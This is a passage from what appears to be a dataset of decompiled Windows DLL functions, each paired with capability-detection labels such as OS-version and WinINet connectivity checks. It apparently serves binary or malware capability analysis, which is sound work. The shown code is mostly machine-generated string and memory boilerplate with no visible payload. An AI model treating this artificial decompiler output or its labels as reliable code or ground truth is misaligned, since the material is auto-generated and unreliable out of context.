uStack480 = *(ppppppuVar26 + 1);\n                            uStack476 = *(ppppppuVar26 + 0xc);\n                            uStack464 = 0xf;\n                        }\n                        else {\n                            uVar27 = uVar24 | 0xf;\n                            if (0x7fffffffffffffff < uVar27) {\n                                uVar27 = 0x7fffffffffffffff;\n                            }\n                            pppppuVar18 = uVar27 + 1;\n                            if (pppppuVar18 < 0x1000) {\n                                if (pppppuVar18 != NULL) {\n                                    pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                                }\n                            }\n                            else {\n                                pppppuVar21 = uVar27 + 0x28;\n                                if (pppppuVar21 <= pppppuVar18) {\n                                    pppppuVar21 = 0xffffffffffffffff;\n                                }\n                                ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n                                if (ppppuVar17 == NULL) goto code_r0x000180024b5c;\n                                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                                pppppuVar18[-1] = ppppuVar17;\n                            }\n                            pppppuStack488 = pppppuVar18;\n                            fcn.1800ade80(pppppuVar18, ppppppuVar26, uVar24 + 1);\n                            uStack464 = uVar27;\n                        }\n                        uStack368 = 0;\n                        uStack360 = 0xf;\n                        uStack384 = 0;\n                        uStack472 = uVar24;\n                        fcn.180011120(&uStack384, 0x1800f46ca, 0);\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        uStack424 = uVar33 & 0xffffffcf | 0x40;\n                        uVar27 = *(var_bp_70h + 0x10) + 6;\n                        if (0xf < uVar27) {\n                            fcn.1800137f0(&ppppppuStack456, uVar27);\n                        }\n                        uStack440 = 0;\n                        fcn.18000dc30(&ppppppuStack456, var_bp_70h);\n                        if (uStack432 - uStack440 < 6) {\n                            ppppppuStack504 = 0x6;\n                            ppppppuVar13 = &ppppppuStack456;\n                            fcn.180014270(ppppppuVar13, 6, 0, 0x1800f5a64);\n                        }\n                        else {\n                            ppppppuVar28 = &ppppppuStack456;\n                            if (0xf < uStack432) {\n                                ppppppuVar28 = ppppppuStack456;\n                            }\n                            ppppppuVar28 = ppppppuVar28 + uStack440;\n                            ppppppuVar13 = ppppppuVar28;\n                            uStack440 = uStack440 + 6;\n                            fcn.1800ade80(ppppppuVar28, 0x1800f5a64, 6);\n                            *(ppppppuVar28 + 6) = 0;\n                        }\n                        pppppuStack496 = &pppppuStack488;\n                        ppppppuStack504 = &uStack384;\n                        pppppuVar16 = fcn.180004f50(ppppppuVar13, &uStack416, uStack304, &ppppppuStack456);\n                        pppppuVar15 = pppppuVar12 + 0x10;\n                        if (pppppuVar15 != pppppuVar16) {\n                            if (0x7 < pppppuVar12[0x13]) {\n                                ppppuVar2 = *pppppuVar15;\n                                ppppuVar22 = ppppuVar2;\n                                if ((0xfff < pppppuVar12[0x13] * 2 + 2U) &&\n                                   (ppppuVar22 = ppppuVar2[-1],  0x1f < ppppuVar2 + (-8 - ppppuVar22)))\n                                goto code_r0x000180024b50;\n                                fcn.18008fb24(ppppuVar22);\n                            }\n                            pppppuVar12[0x12] = NULL;\n                            pppppuVar12[0x13] = 0x7;\n                            *pppppuVar15 = 0;\n                            uVar8 = *(pppppuVar16 + 4);\n                            uVar4 = *(pppppuVar16 + 1);\n                            uVar5 = *(pppppuVar16 + 0xc);\n                            *pppppuVar15 = *pppppuVar16;\n                            *(pppppuVar12 + 0x84) = uVar8;\n                            *(pppppuVar12 + 0x11) = uVar4;\n                            *(pppppuVar12 + 0x8c) = uVar5;\n                            uVar8 = *(pppppuVar16 + 0x14);\n                            uVar4 = *(pppppuVar16 + 3);\n                            uVar5 = *(pppppuVar16 + 0x1c);\n                            *(pppppuVar12 + 0x12) = *(pppppuVar16 + 2);\n                            *(pppppuVar12 + 0x94) = uVar8;\n                            *(pppppuVar12 + 0x13) = uVar4;\n                            *(pppppuVar12 + 0x9c) = uVar5;\n                            pppppuVar16[2] = NULL;\n                            pppppuVar16[3] = 0x7;\n                            *pppppuVar16 = 0;\n                        }\n                        if (7 < uStack392) {\n                            iVar19 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack392 * 2 + 2) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U)\n                               ) goto code_r0x000180024b50;\n                            fcn.18008fb24(iVar32);\n                        }\n                        uStack400 = 0;\n                        uStack392 = 7;\n                        uStack416 = 0;\n                        uStack415 = 0;\n                        if (0xf < uStack432) {\n                            ppppppuVar13 = ppppppuStack456;\n                            if ((0xfff < uStack432 + 1) &&\n                               (ppppppuVar13 = ppppppuStack456[-1],  0x1f < ppppppuStack456 + (-8 - ppppppuVar13)))\n                            goto code_r0x000180024b56;\n                            fcn.18008fb24(ppppppuVar13);\n                        }\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        if (0xf < uStack360) {\n                            iVar19 = CONCAT71(Stack383, uStack384);\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack360 + 1) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U))\n                            goto code_r0x000180024b5c;\n                            fcn.18008fb24(iVar32);\n                        }\n                        pppppuStack296 = &pppppuStack488;\n                        uStack472 = 0;\n                        uStack464 = 0;\n                        ppppppuVar26 = appppppuStack152;\n                        if (0xf < var_bp_78h) {\n                            ppppppuVar26 = appppppuStack152[0];\n                        }\n                        if (uVar24 < 0x10) {\n                            pppppuStack488 = *ppppppuVar26;\n                            uStack480 = *(ppppppuVar26 + 1);\n                            uStack476 = *(ppppppuVar26 + 0xc);\n                            uStack464 = 0xf;\n                        }\n                        else {\n                            uVar27 = uVar24 | 0xf;\n                            if (0x7fffffffffffffff < uVar27) {\n                                uVar27 = 0x7fffffffffffffff;\n                            }\n                            pppppuVar18 = uVar27 + 1;\n                            if (pppppuVar18 < 0x1000) {\n                                if (pppppuVar18 != NULL) {\n                                    pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                                }\n                            }\n                            else {\n                                pppppuVar21 = uVar27 + 0x28;\n                                if (pppppuVar21 <= pppppuVar18) {\n                                    pppppuVar21 = 0xffffffffffffffff;\n                                }\n                                ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n                                if (ppppuVar17 == NULL) {\n                                    fcn.1800b3528();\n                                    pcVar3 = swi(3);\n                                    (*pcVar3)();\n                                    return;\n                                }\n                                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                                pppppuVar18[-1] = ppppuVar17;\n                            }\n                            pppppuStack488 = pppppuVar18;\n                            fcn.1800ade80(pppppuVar18, ppppppuVar26, uVar24 + 1);\n                            uStack464 = uVar27;\n                        }\n                        uStack400 = 0;\n                        uStack392 = 0xf;\n                        uStack416 = 0;\n                        uStack472 = uVar24;\n                        fcn.180011120(&uStack416, 0x1800f46cb, 0);\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        uStack424 = uVar33 & 0xffffff8f | 0x80;\n                        uVar24 = *(var_bp_70h + 0x10) + 0xc;\n                        if (0xf < uVar24) {\n                            fcn.1800137f0(&ppppppuStack456, uVar24);\n                        }\n                        uStack440 = 0;\n                        fcn.18000dc30(&ppppppuStack456, var_bp_70h);\n                        if (uStack432 - uStack440 < 0xc) {\n                            ppppppuStack504 = 0xc;\n                            ppppppuVar13 = &ppppppuStack456;\n                            fcn.180014270(ppppppuVar13, 0xc, 0, 0x1800f60e8);\n                        }\n                        else {\n                            ppppppuVar28 = &ppppppuStack456;\n                            if (0xf < uStack432) {\n                                ppppppuVar28 = ppppppuStack456;\n                            }\n                            ppppppuVar28 = ppppppuVar28 + uStack440;\n                            ppppppuVar13 = ppppppuVar28;\n                            uStack440 = uStack440 + 0xc;\n                            fcn.1800ade80(ppppppuVar28, 0x1800f60e8, 0xc);\n                            *(ppppppuVar28 + 0xc) = 0;\n                        }\n                        uVar10 = uStack304;\n                        pppppuStack496 = &pppppuStack488;\n                        ppppppuStack504 = &uStack416;\n                        pppppuVar16 = fcn.180004f50(ppppppuVar13, &uStack384, uStack304, &ppppppuStack456);\n                        pppppuVar15 = pppppuVar12 + 0xc;\n                        if (pppppuVar15 != pppppuVar16) {\n                            if (0x7 < pppppuVar12[0xf]) {\n                                ppppuVar2 = *pppppuVar15;\n                                iVar32 = pppppuVar12[0xf] * 2;\n                                ppppuVar22 = ppppuVar2;\n                                if (0xfff < iVar32 + 2U) {\n                                    ppppuVar22 = ppppuVar2[-1];\n                                    if (0x1f < (ppppuVar2 - ppppuVar22) - 8U) {\n                                        fcn.1800b3528(ppppuVar2 - ppppuVar22, iVar32 + 0x29);\n                                        goto code_r0x000180024ab4;\n                                    }\n                                }\n                                fcn.18008fb24(ppppuVar22);\n                            }\n                            pppppuVar12[0xe] = NULL;\n                            pppppuVar12[0xf] = 0x7;\n                            *pppppuVar15 = 0;\n                            uVar8 = *(pppppuVar16 + 4);\n                            uVar4 = *(pppppuVar16 + 1);\n                            uVar5 = *(pppppuVar16 + 0xc);\n                            *pppppuVar15 = *pppppuVar16;\n                            *(pppppuVar12 + 100) = uVar8;\n                            *(pppppuVar12 + 0xd) = uVar4;\n                            *(pppppuVar12 + 0x6c) = uVar5;\n                            uVar8 = *(pppppuVar16 + 0x14);\n                            uVar4 = *(pppppuVar16 + 3);\n                            uVar5 = *(pppppuVar16 + 0x1c);\n                            *(pppppuVar12 + 0xe) = *(pppppuVar16 + 2);\n                            *(pppppuVar12 + 0x74) = uVar8;\n                            *(pppppuVar12 + 0xf) = uVar4;\n                            *(pppppuVar12 + 0x7c) = uVar5;\n                            pppppuVar16[2] = NULL;\n                            pppppuVar16[3] = 0x7;\n                            *pppppuVar16 = 0;\n                        }\n                        fcn.180003e40(&uStack384);\n                        uVar33 = uVar33 & 0xffffff0f;\n                        fcn.18000dd00(&ppppppuStack456);\n                        fcn.18000dd00(&uStack416);\n                        pppppuStack296 = &uStack384;\n                        pppppuVar18 = fcn.18000de50(&uStack384, appppppuStack152);\n                        fcn.18000ddf0(&uStack416, 0x1800f46ce);\n                        arg4_00 = fcn.180012870(&pppppuStack352, var_bp_70h, 0x1800f60f8);\n                        ppppppuStack504 = &uStack416;\n                        pppppuStack496 = pppppuVar18;\n                        uVar10 = fcn.180004f50(ppppppuStack504, &pppppuStack488, uVar10, arg4_00);\n                        fcn.18000d960(pppppuVar12 + 8, uVar10);\n                        fcn.180003e40(&pppppuStack488);\n                        fcn.18000dd00(&pppppuStack352);\n                        fcn.18000dd00(&uStack416);\n                        var_58h = var_58h + 1;\n                        uVar24 = uStack136;\n                    } while (var_58h < aiStack312[0]);\n                }\n                fcn.18000d390(&var_bp_70h);\n                fcn.18000dd00(appppppuStack152);\n                fcn.18008fb00(var_50h ^ auStack536);\n                return;\n            }\n            iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n            iVar19 = iVar6;\n            if ((uStack392 + 1 < 0x1000) || (iVar19 = *(iVar6 + -8),  (iVar6 - iVar19) - 8U < 0x20)) {\n                fcn.18008fb24(iVar19);\n                goto code_r0x000180023d67;\n            }\n            goto code_r0x000180024b26;\n        }\n        pppppuVar18 = pppppuStack352;\n        if ((uStack328 + 1 < 0x1000) || (pppppuVar18 = pppppuStack352[-1],  pppppuStack352 + (-8 - pppppuVar18) < 0x20))\n        {\n            fcn.18008fb24(pppppuVar18);\n            goto code_r0x000180023d1a;\n        }\n    }\n    else {\n        iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n        iVar19 = iVar6;\n        if ((uStack392 * 2 + 2 < 0x1000) || (iVar19 = *(iVar6 + -8),  (iVar6 - iVar19) - 8U < 0x20)) {\n            fcn.18008fb24(iVar19);\n            goto code_r0x000180023002;\n        }\ncode_r0x000180024ab4:\n        fcn.1800b3528();\ncode_r0x000180024aba:\n        fcn.1800b3528();\ncode_r0x000180024ac0:\n        fcn.1800b3528();\ncode_r0x000180024ac6:\n        fcn.1800b3528();\ncode_r0x000180024acc:\n        fcn.1800b3528();\ncode_r0x000180024ad2:\n        fcn.1800b3528();\ncode_r0x000180024ad8:\n        fcn.1800b3528();\ncode_r0x000180024ade:\n        fcn.1800b3528();\ncode_r0x000180024ae4:\n        fcn.1800b3528();\ncode_r0x000180024aea:\n        fcn.1800b3528();\ncode_r0x000180024af0:\n        fcn.1800b3528();\ncode_r0x000180024af6:\n        fcn.1800b3528();\ncode_r0x000180024afc:\n        fcn.1800b3528();\ncode_r0x000180024b02:\n        fcn.1800b3528();\ncode_r0x000180024b08:\n        fcn.1800b3528();\ncode_r0x000180024b0e:\n        fcn.1800b3528();\ncode_r0x000180024b14:\n        fcn.1800b3528();\ncode_r0x000180024b1a:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180024b26:\n    fcn.1800b3528();\ncode_r0x000180024b2c:\n    fcn.1800b3528();\ncode_r0x000180024b32:\n    fcn.1800b3528();\ncode_r0x000180024b38:\n    fcn.1800b3528();\ncode_r0x000180024b3e:\n    fcn.1800b3528();\ncode_r0x000180024b44:\n    fcn.1800b3528();\ncode_r0x000180024b4a:\n    fcn.1800b3528();\ncode_r0x000180024b50:\n    fcn.1800b3528();\ncode_r0x000180024b56:\n    fcn.1800b3528();\ncode_r0x000180024b5c:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 17174
    },
    "1800256b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h_2\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800256b0(int64_t arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    ulong **arg2_00;\n    code *pcVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    char cVar12;\n    ulong uVar13;\n    ulong *puVar14;\n    int64_t *piVar15;\n    uchar *puVar16;\n    ushort *puVar17;\n    uint *puVar18;\n    uint64_t uVar19;\n    ulong uVar20;\n    int64_t iVar21;\n    int64_t iVar22;\n    ushort *puVar23;\n    uint64_t arg2_01;\n    int64_t iVar24;\n    uint64_t uVar25;\n    uint *puVar26;\n    ulong *arg3;\n    uint32_t uVar27;\n    bool bVar28;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_18h;\n    ulong in_stack_00000028;\n    ulong var_bp_40h;\n    ulong var_50h;\n    ulong var_bp_58h;\n    ulong var_60h;\n    ulong var_bp_68h;\n    ulong var_80h_2;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b0h;\n    ulong var_c0h;\n    ulong var_d0h;\n    ulong var_e0h;\n    ulong var_f0h;\n    ulong var_f8h;\n    ulong var_110h;\n    ulong var_118h;\n    ulong var_120h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_160h;\n    ulong var_168h;\n    ulong var_170h;\n    ulong var_188h;\n    ulong var_190h;\n    ulong var_198h;\n    ulong var_1b0h;\n    ulong var_1b8h;\n    ulong var_1c8h;\n    ulong var_1d8h;\n    ulong var_1e0h;\n    ulong var_1e8h;\n    ulong var_1f0h;\n    ulong var_210h;\n    ulong var_230h;\n    ulong var_250h;\n    ulong var_270h;\n    ulong var_290h;\n    ulong var_2b0h;\n    ulong var_2d0h;\n    ulong var_2f0h;\n    ulong var_310h;\n    ulong var_330h;\n    ulong var_350h;\n    ulong var_370h;\n    ulong var_390h;\n    ulong var_3b0h;\n    ulong var_3d0h;\n    ulong var_3f0h;\n    ulong var_410h;\n    ulong var_430h;\n    ulong var_450h;\n    ulong var_470h;\n    ulong var_4f0h;\n    ulong var_570h;\n    ulong var_580h;\n    ulong var_588h;\n    ulong var_590h;\n    ulong var_5a0h;\n    ulong var_5a8h;\n    ulong var_5b0h;\n    ulong var_5c0h;\n    ulong var_5c8h;\n    ulong var_5d0h;\n    ulong var_5e0h;\n    ulong var_5e8h;\n    ulong var_5f0h;\n    ulong var_600h;\n    ulong var_608h;\n    ulong var_610h;\n    ulong var_620h;\n    ulong var_628h;\n    ulong var_630h;\n    ulong var_640h;\n    ulong var_650h;\n    ulong var_660h;\n    ulong var_670h;\n    ulong var_680h;\n    ulong var_690h;\n    ulong var_6a0h;\n    ulong var_6a8h;\n    ulong var_6b0h;\n    ulong var_6c0h;\n    ulong var_6c8h;\n    ulong var_6d0h;\n    ulong var_6e0h;\n    ulong var_6f0h;\n    ulong var_700h;\n    ulong var_710h;\n    ulong var_720h;\n    ulong var_740h;\n    ulong var_7c0h;\n    uchar auStack2312 [32];\n    ulong **ppuStack2280;\n    ulong *puStack2272;\n    uint32_t uStack2248;\n    uint uStack2240;\n    uint uStack2236;\n    uint uStack2232;\n    uint uStack2228;\n    ulong uStack2224;\n    ulong uStack2216;\n    ulong uStack2208;\n    uint64_t uStack2192;\n    uint64_t uStack2184;\n    uint uStack2176;\n    uint uStack2172;\n    uint uStack2168;\n    uint uStack2164;\n    int64_t iStack2160;\n    uint64_t uStack2152;\n    uint uStack2144;\n    uint uStack2140;\n    uint uStack2136;\n    uint uStack2132;\n    uint64_t uStack2128;\n    uint64_t uStack2120;\n    ulong uStack2112;\n    uint uStack2104;\n    uint uStack2100;\n    int64_t iStack2096;\n    uint64_t uStack2088;\n    int64_t iStack2080;\n    ushort uStack2072;\n    unkbyte6 Stack2070;\n    ulong uStack2056;\n    uint64_t uStack2048;\n    uint32_t auStack2040 [2];\n    int64_t iStack2032;\n    uchar auStack2024 [32];\n    ushort uStack1992;\n    unkbyte6 Stack1990;\n    uint uStack1976;\n    uint uStack1972;\n    uint uStack1968;\n    uint uStack1964;\n    ulong uStack1960;\n    int64_t *piStack1952;\n    int64_t aiStack1928 [3];\n    uint64_t uStack1904;\n    ulong uStack1896;\n    ulong uStack1888;\n    uint uStack1880;\n    uint uStack1876;\n    uint uStack1872;\n    uint uStack1868;\n    uint uStack1864;\n    uint uStack1860;\n    uint uStack1856;\n    uint uStack1852;\n    uint uStack1848;\n    uint uStack1844;\n    uint uStack1840;\n    uint uStack1836;\n    uint uStack1832;\n    uint uStack1828;\n    uint uStack1824;\n    uint uStack1820;\n    ulong *puStack1816;\n    uchar auStack1808 [24];\n    int64_t *piStack1784;\n    ulong *puStack1776;\n    uchar auStack1768 [24];\n    int64_t *piStack1744;\n    ulong *puStack1736;\n    uchar auStack1728 [24];\n    int64_t *piStack1704;\n    ulong *puStack1696;\n    uchar auStack1688 [24];\n    int64_t *piStack1664;\n    ulong *puStack1656;\n    uchar auStack1648 [24];\n    int64_t *piStack1624;\n    uint uStack1616;\n    uint uStack1612;\n    uint uStack1608;\n    uint uStack1604;\n    uint uStack1600;\n    uint uStack1596;\n    uint uStack1592;\n    uint uStack1588;\n    ulong uStack1584;\n    uchar auStack1576 [8];\n    uchar auStack1568 [8];\n    uchar auStack1560 [32];\n    uchar auStack1528 [32];\n    uchar auStack1496 [32];\n    uchar auStack1464 [32];\n    uchar auStack1432 [32];\n    uchar auStack1400 [32];\n    uchar auStack1368 [32];\n    uchar auStack1336 [32];\n    uchar auStack1304 [32];\n    uchar auStack1272 [32];\n    uchar auStack1240 [32];\n    uchar auStack1208 [32];\n    uchar auStack1176 [32];\n    uchar auStack1144 [32];\n    uchar auStack1112 [32];\n    uchar auStack1080 [32];\n    uchar auStack1048 [32];\n    uchar auStack1016 [32];\n    uchar auStack984 [32];\n    uchar auStack952 [32];\n    uchar auStack920 [128];\n    uchar auStack792 [128];\n    ulong uStack664;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    ulong uStack632;\n    uint uStack624;\n    uint uStack620;\n    int64_t iStack616;\n    uint64_t uStack608;\n    ulong uStack600;\n    uint uStack592;\n    uint uStack588;\n    int64_t iStack584;\n    uint64_t uStack576;\n    ulong uStack568;\n    uint uStack560;\n    uint uStack556;\n    int64_t iStack552;\n    uint64_t uStack544;\n    ushort uStack536;\n    unkbyte6 Stack534;\n    ulong **ppuStack520;\n    uint64_t uStack512;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    ushort auStack440 [8];\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    ushort auStack408 [8];\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    ushort uStack376;\n    unkbyte6 Stack374;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    ushort uStack344;\n    unkbyte6 Stack342;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    ushort auStack312 [8];\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    ushort auStack280 [8];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uchar auStack248 [16];\n    uchar auStack232 [32];\n    int16_t aiStack200 [32];\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_60h_2;\n    ulong var_bp_48h;\n    uint64_t uStack72;\n    ulong var_38h;\n    ulong var_bp_28h;\n    ulong var_bp_20h;\n    ulong var_18h_2;\n    ulong var_10h_2;\n    \n    uStack1584 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack2312;\n    uStack1888 = in_stack_00000028;\n    arg2_01 = 0;\n    uStack2248 = 0;\n    ppuStack520 = NULL;\n    uStack512 = 7;\n    uStack536 = 0;\n    uStack648 = *0x180101900;\n    uStack644 = *0x180101904;\n    uStack640 = *0x180101908;\n    uStack636 = *0x18010190c;\n    uStack664._0_2_ = 0;\n    uStack296 = *0x180101900;\n    uStack292 = *0x180101904;\n    uStack288 = *0x180101908;\n    uStack284 = *0x18010190c;\n    auStack312[0] = 0;\n    uStack264 = *0x180101900;\n    uStack260 = *0x180101904;\n    uStack256 = *0x180101908;\n    uStack252 = *0x18010190c;\n    auStack280[0] = 0;\n    uStack392 = *0x180101900;\n    uStack388 = *0x180101904;\n    uStack384 = *0x180101908;\n    uStack380 = *0x18010190c;\n    auStack408[0] = 0;\n    uStack424 = *0x180101900;\n    uStack420 = *0x180101904;\n    uStack416 = *0x180101908;\n    uStack412 = *0x18010190c;\n    auStack440[0] = 0;\n    arg3 = arg2 * 0xf0 + *(arg1 + 0xd8);\n    iStack2032 = arg1;\n    uStack1896 = arg4;\n    fcn.180010d70(&uStack536, 0x1800f608c, 2);\n    uVar13 = fcn.1800687b0(auStack920);\n    puVar14 = arg3;\n    if (7 < arg3[3]) {\n        puVar14 = *arg3;\n    }\n    fcn.180068c50(uVar13, &uStack504, puVar14, puVar14 + arg3[2] * 2);\n    fcn.1800686c0(auStack920);\n    puStack1696 = NULL;\n    fcn.18002ddc0(auStack1688);\n    fcn.18002f0b0(&puStack1696, 0x1800f5b54, 0x1800f5b5a);\n    uStack2224 = CONCAT44(*0x180101914, *0x180101910);\n    uStack2216 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack2240._0_1_ = 0;\n    uStack2248 = 0x1c;\n    iStack616 = CONCAT44(*0x180101914, *0x180101910);\n    uStack608 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack632._0_1_ = 0;\n    fcn.180011120(&uStack632, 0x1800f46cf, 0);\n    puVar18 = &uStack504;\n    if (0xf < CONCAT44(uStack476, uStack480)) {\n        puVar18 = CONCAT44(uStack500, uStack504);\n    }\n    puVar26 = &uStack504;\n    if (0xf < CONCAT44(uStack476, uStack480)) {\n        puVar26 = CONCAT44(uStack500, uStack504);\n    }\n    puStack2272 = &uStack632;\n    ppuStack2280 = &puStack1696;\n    fcn.180030580(&uStack1960, &uStack2240, puVar26, puVar18 + CONCAT44(uStack484, uStack488));\n    if (0xf < uStack608) {\n        iVar22 = CONCAT44(uStack632._4_4_, CONCAT22(uStack632._2_2_, CONCAT11(uStack632._1_1_, uStack632)));\n        iVar24 = iVar22;\n        if ((0xfff < uStack608 + 1) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U)) {\ncode_r0x000180027629:\n            fcn.1800b3528();\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        fcn.18008fb24(iVar24);\n    }\n    uVar19 = CONCAT44(uStack476, uStack480);\n    if (0xf < uVar19) {\n        iVar22 = CONCAT44(uStack500, uStack504);\n        iVar24 = iVar22;\n        if (0xfff < uVar19 + 1) {\n            iVar24 = *(iVar22 + -8);\n            if (0x1f < (iVar22 - iVar24) - 8U) {\n                fcn.1800b3528(iVar24, uVar19 + 0x28);\n                goto code_r0x000180027635;\n            }\n        }\n        fcn.18008fb24(iVar24);\n    }\n    uStack504 = CONCAT22(uStack2240._2_2_, CONCAT11(uStack2240._1_1_, uStack2240));\n    uStack500 = uStack2236;\n    uStack496 = uStack2232;\n    uStack492 = uStack2228;\n    uStack488 = uStack2224;\n    uStack484 = uStack2224._4_4_;\n    uStack480 = uStack2216;\n    uStack476 = uStack2216._4_4_;\n    uStack2224 = CONCAT44(*0x180101914, *0x180101910);\n    uStack2216 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack2240._0_1_ = 0;\n    fcn.18002e090(&puStack1696);\n    if ((piStack1664 != NULL) && (puVar14 = (**(*piStack1664 + 0x10))(),  puVar14 != NULL)) {\n        (***puVar14)(puVar14, 1);\n    }\n    puStack1656 = NULL;\n    fcn.18002ddc0(auStack1648);\n    fcn.18002f0b0(&puStack1656, 0x1800f6160, 0x1800f616b);\n    uStack2192 = CONCAT44(*0x180101914, *0x180101910);\n    uStack2184 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack2208._0_1_ = 0;\n    uStack2248 = 0x2c;\n    iStack584 = CONCAT44(*0x180101914, *0x180101910);\n    uStack576 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack600._0_1_ = 0;\n    fcn.180011120(&uStack600, 0x1800f5a6c, 1);\n    puVar18 = &uStack504;\n    if (0xf < CONCAT44(uStack476, uStack480)) {\n        puVar18 = CONCAT44(uStack500, uStack504);\n    }\n    puVar26 = &uStack504;\n    if (0xf < CONCAT44(uStack476, uStack480)) {\n        puVar26 = CONCAT44(uStack500, uStack504);\n    }\n    puStack2272 = &uStack600;\n    ppuStack2280 = &puStack1656;\n    fcn.180030580(&iStack2080, &uStack2208, puVar26, CONCAT44(uStack484, uStack488) + puVar18);\n    if (0xf < uStack576) {\n        iVar22 = CONCAT44(uStack600._4_4_, CONCAT22(uStack600._2_2_, CONCAT11(uStack600._1_1_, uStack600)));\n        iVar24 = iVar22;\n        if ((0xfff < uStack576 + 1) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U)) {\ncode_r0x000180027635:\n            fcn.1800b3528();\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        fcn.18008fb24(iVar24);\n    }\n    uVar13 = fcn.1800687b0(auStack792);\n    puVar16 = &uStack2208;\n    if (0xf < uStack2184) {\n        puVar16 = CONCAT62(uStack2208._2_6_, CONCAT11(uStack2208._1_1_, uStack2208));\n    }\n    fcn.180069050(uVar13, &uStack472, puVar16, puVar16 + uStack2192);\n    fcn.1800686c0(auStack792);\n    if (7 < CONCAT44(uStack636, uStack640)) {\n        iVar24 = CONCAT44(uStack636, uStack640) * 2;\n        iVar21 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n        iVar22 = iVar21;\n        if (iVar24 + 2U < 0x1000) {\ncode_r0x000180025b2a:\n            fcn.18008fb24(iVar22);\n            goto code_r0x000180025b2f;\n        }\n        iVar22 = *(iVar21 + -8);\n        if ((iVar21 - iVar22) - 8U < 0x20) goto code_r0x000180025b2a;\n        fcn.1800b3528(iVar22, iVar24 + 0x29);\ncode_r0x000180027641:\n        fcn.1800b3528();\ncode_r0x000180027647:\n        fcn.1800b3528();\n        pcVar5 = swi(3);\n        (*pcVar5)();\n        return;\n    }\ncode_r0x000180025b2f:\n    uStack664._0_2_ = uStack472;\n    uStack664._2_2_ = uStack472 >> 0x10;\n    uStack664._4_4_ = uStack468;\n    uStack656 = uStack464;\n    uStack652 = uStack460;\n    uStack648 = uStack456;\n    uStack644 = uStack452;\n    uStack640 = uStack448;\n    uStack636 = uStack444;\n    if (0xf < uStack2184) {\n        iVar22 = CONCAT62(uStack2208._2_6_, CONCAT11(uStack2208._1_1_, uStack2208));\n        iVar24 = iVar22;\n        if ((0xfff < uStack2184 + 1) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n        goto code_r0x000180027641;\n        fcn.18008fb24(iVar24);\n    }\n    uStack2192 = CONCAT44(*0x180101914, *0x180101910);\n    uStack2184 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack2208._0_1_ = 0;\n    fcn.18002e090(&puStack1656);\n    if ((piStack1624 != NULL) && (puVar14 = (**(*piStack1624 + 0x10))(),  puVar14 != NULL)) {\n        